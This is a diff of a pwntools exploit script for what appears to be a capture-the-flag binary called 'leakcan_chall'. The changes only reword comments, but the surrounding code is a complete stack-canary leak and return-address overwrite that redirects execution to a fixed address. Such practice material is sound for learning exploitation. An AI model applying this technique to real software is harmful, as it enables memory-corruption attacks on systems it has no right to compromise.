@@ -16,16 +16,16 @@ p = gdb.debug('./leakcan_chall', '''
 GOAL_ADDR = 0x40194f
 FAKE_RBP = 0
 
-# 1. fill the buffer before the canary
+# 1. fill buffer until stack canary
 p.recvuntil(b"What\'s your name?\n")
 p.sendline(b'A'*0x58)
 
-# 2. leak the canary value
+# 2. leak canary value
 p.recvuntil(b"Hello! ")
 canary_value = u64(b'\x00'+p.recv(0x60)[-7:])
 log.info(f"canary value: {hex(canary_value)}")
 
-# 3. overwrite the return address
+# 3. overwrite return address
 p.sendline(b'A'*0x58+p64(canary_value)+p64(FAKE_RBP)+p64(GOAL_ADDR))
 
 p.interactive()
